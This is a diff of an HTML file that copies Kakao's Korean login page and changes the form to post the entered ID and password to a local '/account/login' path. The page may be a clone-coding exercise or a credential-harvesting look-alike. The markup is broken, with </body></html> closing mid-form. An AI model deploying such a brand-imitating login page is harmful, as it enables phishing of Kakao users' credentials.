@@ -7,34 +7,38 @@
     <title>카카오계정</title>
     <link rel="stylesheet" href="/static/css/account/login.css">
 </head>
+
 <body class="type_responsive">
     <div id="__next" data-reactroot="">
-        <div class="container-doc">
-            <div class="inner_container">
-                <main class="doc-main">
-                    <div class="doc-title">
-                        <h1 class="tit_service">
-                            <span class="logo_kakao">
-                                <span class="ir_wa">Kakao</span>
-                            </span>
-                        </h1>
-                    </div>
-                    <article id="mainContent" class="content-article">
-                        <div class="cont_login">
-                            <div class="login_kakaomail">
-                                <form>
-                                    <div class="box_tf fst">
-                                        <label class="screen_out" for="loginKey--1">계정정보 입력</label>
-        <input type="text" id="loginKey--1" name="loginKey" placeholder="카카오메일 아이디, 이메일, 전화번호 " class="tf_g" value="">
-        <div class="util_tf">
+    <div class="container-doc">
+        <div class="inner_container">
+            <main class="doc-main">
+                <div class="doc-title">
+                    <h1 class="tit_service">
+                        <span class="logo_kakao">
+                            <span class="ir_wa">Kakao</span>
+                        </span>
+                    </h1>
+                </div>
+                <article id="mainContent" class="content-article">
+                    <div class="cont_login">
+                        <div class="login_kakaomail">
+                            <form action="/account/login" method="post">
+                                <div class="box_tf fst">
+                                    <label class="screen_out" for="loginKey--1">계정정보 입력</label>
+                                    <input type="text" id="loginKey--1" name="loginKey"
+                                           placeholder="카카오메일 아이디, 이메일, 전화번호 " class="tf_g" value="">
+                                    <div class="util_tf">
 
-        </div>
-    </div>
-    <div class="box_tf">
-        <label class="screen_out" for="password--2">비밀번호 입력</label>
-        <input type="password" id="password--2" name="password" placeholder="비밀번호" autocomplete="off" class="tf_g" value="">
+                                    </div>
+                                </div>
+                                <div class="box_tf">
+                                    <label class="screen_out" for="password--2">비밀번호 입력</label>
+                                    <input type="password" id="password--2" name="password" placeholder="비밀번호"
+                                           autocomplete="off" class="tf_g" value="">
 </body>
 </html>
+
 <div class="util_tf">
 
 </div>
@@ -44,30 +48,34 @@
         <input type="checkbox" id="staySignedIn--3" class="inp_choice" name="staySignedIn" value="false">
         <label class="lab_choice" for="staySignedIn--3" id="label-staySignedIn">
             <span class="ico_comm ico_check"></span>로그인 상태 유지</label>
-            <button type="button" class="btn_help" aria-haspopup="true" aria-describedby="label-staySignedIn">
-                <span class="ico_comm ico_help">도움말 보기</span>
-            </button>
-        </div>
+        <button type="button" class="btn_help" aria-haspopup="true" aria-describedby="label-staySignedIn">
+            <span class="ico_comm ico_help">도움말 보기</span>
+        </button>
     </div>
-    <div class="confirm_btn"><button type="submit" class="btn_g highlight submit">로그인</button>
-        <span class="line_or">
+</div>
+<div class="confirm_btn">
+    <button type="submit" class="btn_g highlight submit">로그인</button>
+    <span class="line_or">
             <span class="txt_or">또는</span>
         </span>
-        <button type="button" class="btn_g">QR코드 로그인</button>
-    </div>
+    <button type="button" class="btn_g">QR코드 로그인</button>
+</div>
 </form>
 
 <div class="info_user">
-    <a href="/weblogin/create_account?app_type=web&amp;continue=https%3A%2F%2Fe.kakao.com%2F&amp;lang=ko" class="link_join">회원가입</a>
+    <a href="/weblogin/create_account?app_type=web&amp;continue=https%3A%2F%2Fe.kakao.com%2F&amp;lang=ko"
+       class="link_join">회원가입</a>
     <ul class="list_user">
         <li>
-            <a href="/weblogin/find_account?app_type=web&amp;continue=https%3A%2F%2Fe.kakao.com%2F&amp;lang=ko" class="link_user">계정 찾기</a>
+            <a href="/weblogin/find_account?app_type=web&amp;continue=https%3A%2F%2Fe.kakao.com%2F&amp;lang=ko"
+               class="link_user">계정 찾기</a>
         </li>
-            <li>
-                <a href="/weblogin/find_password?app_type=web&amp;continue=https%3A%2F%2Fe.kakao.com%2F&amp;lang=ko" class="link_user">비밀번호 찾기</a>
-            </li>
-        </ul>
-    </div>
+        <li>
+            <a href="/weblogin/find_password?app_type=web&amp;continue=https%3A%2F%2Fe.kakao.com%2F&amp;lang=ko"
+               class="link_user">비밀번호 찾기</a>
+        </li>
+    </ul>
+</div>
 </div>
 </div>
 </article>
@@ -83,24 +91,27 @@
         <a href="https://cs.kakao.com/" class="link_info">고객센터</a>
         <a href="https://www.kakao.com/notices?lang=ko" class="link_info">공지사항</a>
         <div class="item_select"><label id="selectLabel" class="screen_out">한국어</label>
-            <button type="button" class="link_selected" role="combobox" aria-controls="listOption" aria-labelledby="selectLabel" aria-haspopup="listbox" aria-expanded="false" aria-activedescendant="">
+            <button type="button" class="link_selected" role="combobox" aria-controls="listOption"
+                    aria-labelledby="selectLabel" aria-haspopup="listbox" aria-expanded="false"
+                    aria-activedescendant="">
                 한국어
                 <span class="ico_comm ico_arr"></span>
-<!--            </button><strong class="screen_out">선택 목록</strong>-->
-            <!-- <ul id="listOption" class="list_select" role="listbox" aria-labelledby="selectLabel">
-                <li role="presentation">
-                    <button type="button" class="link_select" aria-selected="true">한국어</button>
-                </li>
-                <li role="presentation">
-                    <button type="button" class="link_select" aria-selected="false">English</button>
-                </li>
-                <li role="presentation">
-                    <button type="button" class="link_select" aria-selected="false">日本語</button>
-                </li>
-            </ul> -->
+                <!--            </button><strong class="screen_out">선택 목록</strong>-->
+                <!-- <ul id="listOption" class="list_select" role="listbox" aria-labelledby="selectLabel">
+                    <li role="presentation">
+                        <button type="button" class="link_select" aria-selected="true">한국어</button>
+                    </li>
+                    <li role="presentation">
+                        <button type="button" class="link_select" aria-selected="false">English</button>
+                    </li>
+                    <li role="presentation">
+                        <button type="button" class="link_select" aria-selected="false">日本語</button>
+                    </li>
+                </ul> -->
         </div>
     </div>
-    <small class="txt_copyright">Copyright © <a class="link_kakaocorp" href="http://kakaocorp.com/">Kakao Corp.</a> All rights reserved.</small>
+    <small class="txt_copyright">Copyright © <a class="link_kakaocorp" href="http://kakaocorp.com/">Kakao Corp.</a> All
+        rights reserved.</small>
 </footer>
 </div>
 </div>
